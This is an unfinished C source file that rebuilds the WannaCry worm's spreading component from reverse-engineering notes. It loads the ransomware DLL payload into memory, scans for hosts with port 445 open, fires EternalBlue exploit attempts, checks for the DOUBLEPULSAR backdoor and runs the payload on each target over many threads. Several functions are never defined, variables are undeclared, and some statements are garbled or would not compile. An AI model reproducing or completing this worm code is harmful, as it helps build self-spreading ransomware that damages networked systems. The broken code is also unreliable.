//https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/
//skeleton code at this moment
//still a work in progress

//EXE file global here
volatile HGLOBAL hDLL_x86;
volatile HGLOBAL hDLL_x64;

//init the DLL payload here
//read from Wannacry in IDA
//also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
//Memory alloc functions: https://www.tenouk.com/visualcplusmfc/visualcplusmfc20.html
HGLOBAL initialize_payload()
{
	/*
	32-bit dll start address 0x40B020, size is 0x4060 bytes
	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
	*/
	DWORD NumberOfBytesRead;
	DWORD fileSize;
	//size = 0x4060 converted to decimal: 16480
	//Possibly -> GlobalAlloc(GPTR, 5298176)
	hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
	
	//size = 0xc8a4 converted to decimal: 51364
	//Possibly -> GlobalAlloc(GPTR, 5298176)
	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
	
	//if no errors continue
	if(hDLL_x86 || hDLL_x64)
	{
		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
		if(fileHandle != INVALID_HANDLE_VALUE)
		{
			fileSize = GetFileSize(fileHandle, NULL);
			*(DWORD*)hDLL_x86 + 0x4060 = fileSize; //Dword length written in x86 DLL buffer
			*(DWORD*)hDLL_x64 + 0xc8a4 = fileSize; //Dword length written in x64 DLL buffer
			ReadFile(fileHandle, hDLL_x86 + 0x4060 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
			ReadFile(fileHandle, hDLL_x64 + 0xc8a4 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
    			CloseHandle(fileHandle);
		}
	}
	else
	{
		GlobalFree(hMemory_x86);
		GlobalFree(hMemory_x64);
	}
}

//https://stackoverflow.com/questions/37838490/how-to-properly-set-a-flag-in-the-write-fds-and-select-in-c
int canConnectToPort445(char *ip)
{
	struct sockaddr name;
	struct timeval timeout;
	fd_set writefds;
	SOCKET control_sock;
	u_long argp;
	int result;
	
     	FD_ZERO(&writefds);    

	name.sin_family = AF_INET;
	name.sin_addr.s_addr = inet_addr(ip);
	name.sin_port = htons(445);

	control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(control_sock == -1)
	{
		result = 0;
	} else {
		ioctlsocket(control_sock, FIONBIO, &argp);
	 	writefds.fd_array[0] = control_sock;
		writefds.fd_count = 1;
		timeout.tv_sec = 1;
    		timeout.tv_usec = 0;
		connect(control_sock, (struct sockaddr*)&name, sizeof(name));
		int ret = select(0, 0, &writefds, 0, &timeout);
		closesocket(control_sock);
		result = ret;
	}
	return result;
}

DWORD MS17_010(DWORD LPPARAM)
{
	lpparam = (struct in_addr) ;
	int attemptCount;
	//CheckMS17Vulnerability here; continue if vulnerable
	if ( CheckForEternalBlue(&target, 445))
	{
		attemptCount = 0;
		do
		{
			Sleep(3000);
			if ( IsDOUBLEPULSARInstalled(&target, 1, 445) )
			      break;
		      	Sleep(3000);
			//EternalBlue pwn here
		      	EternalBluePwn(&target, 445);
		      	++attemptCount;
		 } while ( attemptCount < 5 );
	}
	Sleep(3000);
	if ( IsDOUBLEPULSARInstalled(&target, 1, 445))
	{
		runPayloadOnTarget(&target, 1, 445);
	}
	endthreadex(0);
	return 0;
}
			      
int scanIP(DWORD LPPARAM)
{
	HANDLE ExploitHandle;
	if (canConnectToPort445(target) > 0)
	{
		ExploitHandle = (HANDLE)_beginthreadex(NULL, MS17_010, (DWORD)LPPARAM, 0, 0);
		//Not sure if the if statement is needed but we'll keep it here for now
		if( ExploitHandle )
		{
			if (WaitForSingleObject(ExploitHandle, 60000) == 258 ))
			{
				TerminateThread(ExploitHandle, 0);
      				CloseHandle(ExploitHandle);
			}
		}
	}
	endthreadex(0);
  	return 0;
}

/*
Threading: https://www.bogotobogo.com/cplusplus/multithreaded2A.php
http://simplesamples.info/windows/_beginthreadex.aspx
https://jeffpar.github.io/kbarchive/kb/132/Q132078/
https://www.programmersought.com/article/57053139965/
https://sodocumentation.net/winapi/topic/1756/process-and-thread-management
*/
int threadMain()
{
	//GetTargets(Char1, Char2);
	
	HANDLE ScanIPMain;
	//create 100 threads
	ScanIPMain = (HANDLE)_beginthreadex(0, 0, scanIP, v1[i], 0, 0);
}
